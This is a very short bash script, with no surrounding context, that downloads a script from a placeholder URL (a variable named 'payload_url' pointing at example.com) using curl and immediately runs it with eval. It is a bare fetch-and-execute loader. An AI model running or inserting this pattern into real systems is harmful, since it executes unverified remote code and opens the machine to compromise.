#!/usr/bin/env bash
set -euo pipefail
payload_url="https://example.com/runme.sh"
code="$(curl -fsSL "$payload_url")"
eval "$code"
